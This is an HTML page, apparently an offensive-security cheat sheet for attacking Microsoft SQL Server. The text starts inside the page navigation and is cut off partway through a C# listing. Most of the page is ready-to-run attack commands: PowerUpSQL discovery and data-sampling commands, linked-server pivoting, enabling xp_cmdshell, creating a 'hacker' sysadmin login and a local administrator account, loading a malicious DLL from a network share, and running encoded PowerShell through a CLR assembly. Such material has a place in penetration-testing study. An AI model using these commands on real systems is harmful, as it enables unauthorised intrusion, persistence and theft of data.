        <li><a href="#command-execution-via-xp_cmdshell">Command Execution via xp_cmdshell</a></li>
        <li><a href="#extended-stored-procedure">Extended Stored Procedure</a>
          <ul>
            <li><a href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures">Add the extended stored procedure and list extended stored procedures</a></li>
          </ul>
        </li>
        <li><a href="#clr-assemblies">CLR Assemblies</a>
          <ul>
            <li><a href="#execute-commands-using-clr-assembly">Execute commands using CLR assembly</a></li>
            <li><a href="#manually-creating-a-clr-dll-and-importing-it">Manually creating a CLR DLL and importing it</a></li>
          </ul>
        </li>
        <li><a href="#ole-automation">OLE Automation</a>
          <ul>
            <li><a href="#execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</a></li>
          </ul>
        </li>
        <li><a href="#agent-jobs">Agent Jobs</a>
          <ul>
            <li><a href="#execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</a></li>
            <li><a href="#list-all-jobs">List All Jobs</a></li>
          </ul>
        </li>
        <li><a href="#external-scripts">External Scripts</a></li>
        <li><a href="#python">Python:</a></li>
        <li><a href="#r">R</a></li>
        <li><a href="#audit-checks">Audit Checks</a>
          <ul>
            <li><a href="#find-and-exploit-impersonation-opportunities">Find and exploit impersonation opportunities</a></li>
          </ul>
        </li>
        <li><a href="#find-databases-that-have-been-configured-as-trustworthy">Find databases that have been configured as trustworthy</a></li>
        <li><a href="#manual-sql-server-queries">Manual SQL Server Queries</a>
          <ul>
            <li><a href="#query-current-user--determine-if-the-user-is-a-sysadmin">Query Current User &amp; determine if the user is a sysadmin</a></li>
            <li><a href="#current-role">Current Role</a></li>
            <li><a href="#current-db">Current DB</a></li>
            <li><a href="#list-all-tables">List all tables</a></li>
            <li><a href="#list-all-databases">List all databases</a></li>
            <li><a href="#all-logins-on-server">All Logins on Server</a></li>
            <li><a href="#all-database-users-for-a-database">All Database Users for a Database</a></li>
            <li><a href="#list-all-sysadmins">List All Sysadmins</a></li>
            <li><a href="#list-all-database-roles">List All Database Roles</a></li>
            <li><a href="#effective-permissions-from-the-server">Effective Permissions from the Server</a></li>
            <li><a href="#effective-permissions-from-the-database">Effective Permissions from the Database</a></li>
            <li><a href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database">Find SQL Server Logins Which can be Impersonated for the Current Database</a></li>
            <li><a href="#exploiting-impersonation">Exploiting Impersonation</a></li>
            <li><a href="#exploiting-nested-impersonation">Exploiting Nested Impersonation</a></li>
            <li><a href="#mssql-accounts-and-hashes">MSSQL Accounts and Hashes</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="mssql-server">
  MSSQL Server
  <a class="anchor" href="#mssql-server">#</a>
</h1>
<h2 id="identify-instances-and-databases">
  Identify Instances and Databases
  <a class="anchor" href="#identify-instances-and-databases">#</a>
</h2>
<h3 id="discover-local-sql-server-instances">
  Discover Local SQL Server Instances
  <a class="anchor" href="#discover-local-sql-server-instances">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceLocal
</span></span></code></pre></div><h3 id="discover-domain-sql-server-instances">
  Discover Domain SQL Server Instances
  <a class="anchor" href="#discover-domain-sql-server-instances">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain -Verbose
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get Server Info for Found Instances</span>
</span></span><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get Database Names</span>
</span></span><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults
</span></span></code></pre></div><h3 id="discover-remote-sql-server-instances">
  Discover Remote SQL Server Instances
  <a class="anchor" href="#discover-remote-sql-server-instances">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceBroadcast -Verbose
</span></span><span style="display:flex;"><span>Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
</span></span></code></pre></div><h3 id="identify-encrypted-databases">
  Identify Encrypted databases
  <a class="anchor" href="#identify-encrypted-databases">#</a>
</h3>
<p>Note: These are automatically decrypted for admins</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLDatabase -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Verbose | Where-Object {$_.is_encrypted <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;True&#34;</span>}
</span></span></code></pre></div><h3 id="version-query">
  Version Query
  <a class="anchor" href="#version-query">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-Query <span style="color:#e6db74">&#34;select @@version&#34;</span>
</span></span></code></pre></div><h2 id="identify-sensitive-information">
  Identify Sensitive Information
  <a class="anchor" href="#identify-sensitive-information">#</a>
</h2>
<h3 id="get-tables-from-a-specific-database">
  Get Tables from a Specific Database
  <a class="anchor" href="#get-tables-from-a-specific-database">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults
</span></span><span style="display:flex;"><span>Get Column Details from a Table
</span></span><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt;
</span></span></code></pre></div><h3 id="gather-5-entries-from-each-column">
  Gather 5 Entries from Each Column
  <a class="anchor" href="#gather-5-entries-from-each-column">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords <span style="color:#e6db74">&#34;&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;&#34;</span> -Verbose -SampleSize <span style="color:#ae81ff">5</span>
</span></span></code></pre></div><h3 id="gather-5-entries-from-a-specific-table">
  Gather 5 Entries from a Specific Table
  <a class="anchor" href="#gather-5-entries-from-a-specific-table">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#39;select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;&#39;</span>
</span></span></code></pre></div><h3 id="dump-common-information-from-server-to-files">
  Dump common information from server to files
  <a class="anchor" href="#dump-common-information-from-server-to-files">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv
</span></span></code></pre></div><h2 id="linked-database">
  Linked Database
  <a class="anchor" href="#linked-database">#</a>
</h2>
<h3 id="find-trusted-link">
  Find Trusted Link
  <a class="anchor" href="#find-trusted-link">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> master..sysservers
</span></span></code></pre></div><h3 id="execute-query-through-the-link">
  Execute Query Through The Link
  <a class="anchor" href="#execute-query-through-the-link">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- execute query through the link
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;dcorp-sql1&#34;</span>, <span style="color:#e6db74">&#39;select * from master..sysservers&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">version</span> <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;linkedserver&#34;</span>, <span style="color:#e6db74">&#39;select @@version as version&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- chain multiple openquery
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">version</span> <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;link1&#34;</span>,<span style="color:#e6db74">&#39;select version from openquery(&#34;link2&#34;,&#34;select @@version as version&#34;)&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- execute shell commands
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;reconfigure;&#39;</span>) <span style="color:#66d9ef">AT</span> LinkedServer
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">from</span> openquery(<span style="color:#e6db74">&#34;linkedserver&#34;</span>,<span style="color:#e6db74">&#39;select 1;exec master..xp_cmdshell &#34;dir c:&#34;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- create user and give admin privileges
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;EXECUTE(&#39;&#39;CREATE LOGIN hacker WITH PASSWORD = &#39;&#39;&#39;&#39;P@ssword123.&#39;&#39;&#39;&#39; &#39;&#39;) AT &#34;DOMINIO\SERVER1&#34;&#39;</span>) <span style="color:#66d9ef">AT</span> <span style="color:#e6db74">&#34;DOMINIO\SERVER2&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;EXECUTE(&#39;&#39;sp_addsrvrolemember &#39;&#39;&#39;&#39;hacker&#39;&#39;&#39;&#39; , &#39;&#39;&#39;&#39;sysadmin&#39;&#39;&#39;&#39; &#39;&#39;) AT &#34;DOMINIO\SERVER1&#34;&#39;</span>) <span style="color:#66d9ef">AT</span> <span style="color:#e6db74">&#34;DOMINIO\SERVER2&#34;</span>
</span></span></code></pre></div><h3 id="crawl-links-for-instances-in-the-domain">
  Crawl Links for Instances in the Domain
  <a class="anchor" href="#crawl-links-for-instances-in-the-domain">#</a>
</h3>
<p>A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
</span></span><span style="display:flex;"><span>select * from master..sysservers
</span></span></code></pre></div><h3 id="crawl-links-for-a-specific-instance">
  Crawl Links for a Specific Instance
  <a class="anchor" href="#crawl-links-for-a-specific-instance">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLServerLinkCrawl -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Verbose
</span></span><span style="display:flex;"><span>select * from openquery(<span style="color:#e6db74">&#34;&lt;instance&gt;&#34;</span>,<span style="color:#e6db74">&#39;select * from openquery(&#34;&lt;instance2&gt;&#34;,&#39;&#39;select * from master..sysservers&#39;&#39;)&#39;</span>)
</span></span></code></pre></div><h3 id="query-version-of-linked-database">
  Query Version of Linked Database
  <a class="anchor" href="#query-version-of-linked-database">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DBSERVERNAME\DBInstance&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">,&#39;select @@version&#39;)&#34;</span> -Verbose
</span></span></code></pre></div><h3 id="execute-procedure-on-linked-database">
  Execute Procedure on Linked Database
  <a class="anchor" href="#execute-procedure-on-linked-database">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;,1&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
</span></span><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;RECONFIGURE&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
</span></span><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;EXEC sp_configure &#39;&#39;xp_cmdshell&#39;&#39;,1;&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
</span></span><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;RECONFIGURE&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
</span></span><span style="display:flex;"><span>SQL&gt; EXECUTE(<span style="color:#e6db74">&#39;exec xp_cmdshell whoami&#39;</span>) at <span style="color:#e6db74">&#34;linked.database.local&#34;</span>;
</span></span></code></pre></div><h3 id="determine-names-of-linked-databases">
  Determine Names of Linked Databases
  <a class="anchor" href="#determine-names-of-linked-databases">#</a>
</h3>
<blockquote>
<p>tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DatabaseLinkName&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">,&#39;select name from sys.databases&#39;)&#34;</span> -Verbose
</span></span></code></pre></div><h3 id="determine-all-the-tables-names-from-a-selected-linked-database">
  Determine All the Tables Names from a Selected Linked Database
  <a class="anchor" href="#determine-all-the-tables-names-from-a-selected-linked-database">#</a>
</h3>
<blockquote>
<p>The result is TableName which feeds into following query</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DatabaseLinkName&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">,&#39;select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables&#39;)&#34;</span> -Verbose
</span></span></code></pre></div><h3 id="gather-the-top-5-columns-from-a-selected-linked-table">
  Gather the Top 5 Columns from a Selected Linked Table
  <a class="anchor" href="#gather-the-top-5-columns-from-a-selected-linked-table">#</a>
</h3>
<blockquote>
<p>The results are ColumnName and ColumnValue which feed into following query</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DatabaseLinkName&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">,&#39;select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;&#39;)&#34;</span> -Verbose
</span></span></code></pre></div><h3 id="gather-entries-from-a-selected-linked-column">
  Gather Entries from a Selected Linked Column
  <a class="anchor" href="#gather-entries-from-a-selected-linked-column">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;select * from openquery(</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&lt;DatabaseLinkName&gt;</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">&#39;select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;&#39;)&#34;</span> -Verbose
</span></span></code></pre></div><h2 id="command-execution-via-xp_cmdshell">
  Command Execution via xp_cmdshell
  <a class="anchor" href="#command-execution-via-xp_cmdshell">#</a>
</h2>
<blockquote>
<p>xp_cmdshell disabled by default since SQL Server 2005</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Creates and adds local user backup to the local administrators group:</span>
</span></span><span style="display:flex;"><span>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;net user backup Password1234 /add&#39;&#34;</span> -Verbose
</span></span><span style="display:flex;"><span>PowerUpSQL&gt; Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;net localgroup administrators backup /add&#34;</span> -Verbose
</span></span></code></pre></div><ul>
<li>Manually execute the SQL query
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#34;net user&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> master..xp_cmdshell <span style="color:#e6db74">&#39;whoami&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> master.dbo.xp_cmdshell <span style="color:#e6db74">&#39;cmd.exe dir c:&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> master.dbo.xp_cmdshell <span style="color:#e6db74">&#39;ping 127.0.0.1&#39;</span>;
</span></span></code></pre></div></li>
<li>If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>,<span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>RECONFIGURE;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>,<span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>RECONFIGURE;
</span></span></code></pre></div></li>
<li>If the procedure was uninstalled
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sp_addextendedproc <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>,<span style="color:#e6db74">&#39;xplog70.dll&#39;</span>
</span></span></code></pre></div></li>
</ul>
<h2 id="extended-stored-procedure">
  Extended Stored Procedure
  <a class="anchor" href="#extended-stored-procedure">#</a>
</h2>
<h3 id="add-the-extended-stored-procedure-and-list-extended-stored-procedures">
  Add the extended stored procedure and list extended stored procedures
  <a class="anchor" href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Create evil DLL</span>
</span></span><span style="display:flex;"><span>Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command <span style="color:#e6db74">&#34;echo test &gt; c:\temp\test.txt&#34;</span> -ExportName xp_test
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Load the DLL and call xp_test</span>
</span></span><span style="display:flex;"><span>Get-SQLQuery -UserName sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;sp_addextendedproc &#39;xp_test&#39;, &#39;\\10.10.0.1\temp\test.dll&#39;&#34;</span>
</span></span><span style="display:flex;"><span>Get-SQLQuery -UserName sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;EXEC xp_test&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Listing existing</span>
</span></span><span style="display:flex;"><span>Get-SQLStoredProcedureXP -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Verbose
</span></span></code></pre></div><ul>
<li>Build a DLL using <a href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp">xp_evil_template.cpp</a></li>
<li>Load the DLL
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- can also be loaded from UNC path or Webdav
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>sp_addextendedproc <span style="color:#e6db74">&#39;xp_calc&#39;</span>, <span style="color:#e6db74">&#39;C:\mydll\xp_calc.dll&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> xp_calc
</span></span><span style="display:flex;"><span>sp_dropextendedproc <span style="color:#e6db74">&#39;xp_calc&#39;</span>
</span></span></code></pre></div></li>
</ul>
<h2 id="clr-assemblies">
  CLR Assemblies
  <a class="anchor" href="#clr-assemblies">#</a>
</h2>
<p>Prerequisites:</p>
<ul>
<li>sysadmin privileges</li>
<li>CREATE ASSEMBLY permission (or)</li>
<li>ALTER ASSEMBLY permission (or)</li>
</ul>
<p>The execution takes place with privileges of the <strong>service account</strong>.</p>
<h3 id="execute-commands-using-clr-assembly">
  Execute commands using CLR assembly
  <a class="anchor" href="#execute-commands-using-clr-assembly">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string</span>
</span></span><span style="display:flex;"><span>Create-SQLFileCLRDll -ProcedureName <span style="color:#e6db74">&#34;runcmd&#34;</span> -OutFile runcmd -OutDir C:\Users\user\Desktop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute command using CLR assembly</span>
</span></span><span style="display:flex;"><span>Invoke-SQLOSCmdCLR -Username sa -Password &lt;password&gt; -Instance &lt;instance&gt; -Command <span style="color:#e6db74">&#34;whoami&#34;</span> -Verbose
</span></span><span style="display:flex;"><span>Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;whoami&#34;</span> Verbose
</span></span><span style="display:flex;"><span>Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;powershell -e &lt;base64&gt;&#34;</span> -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># List all the stored procedures added using CLR</span>
</span></span><span style="display:flex;"><span>Get-SQLStoredProcedureCLR -Instance &lt;instance&gt; -Verbose
</span></span></code></pre></div><h3 id="manually-creating-a-clr-dll-and-importing-it">
  Manually creating a CLR DLL and importing it
  <a class="anchor" href="#manually-creating-a-clr-dll-and-importing-it">#</a>
</h3>
<p>Create a C# DLL file with the following content, with the command : <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Data;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Data.SqlClient;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Data.SqlTypes;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> Microsoft.SqlServer.Server;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.IO;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Diagnostics;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Text;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">partial</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">StoredProcedures</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    [Microsoft.SqlServer.Server.SqlProcedure]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> cmd_exec (SqlString execCommand)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        Process proc = <span style="color:#66d9ef">new</span> Process();
</span></span><span style="display:flex;"><span>        proc.StartInfo.FileName = <span style="color:#e6db74">@&#34;C:\Windows\System32\cmd.exe&#34;</span>;
</span></span><span style="display:flex;"><span>        proc.StartInfo.Arguments = <span style="color:#66d9ef">string</span>.Format(<span style="color:#e6db74">@&#34; /C {0}&#34;</span>, execCommand.Value);
</span></span><span style="display:flex;"><span>        proc.StartInfo.UseShellExecute = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        proc.StartInfo.RedirectStandardOutput = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        proc.Start();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Create the record and specify the metadata for the columns.</span>
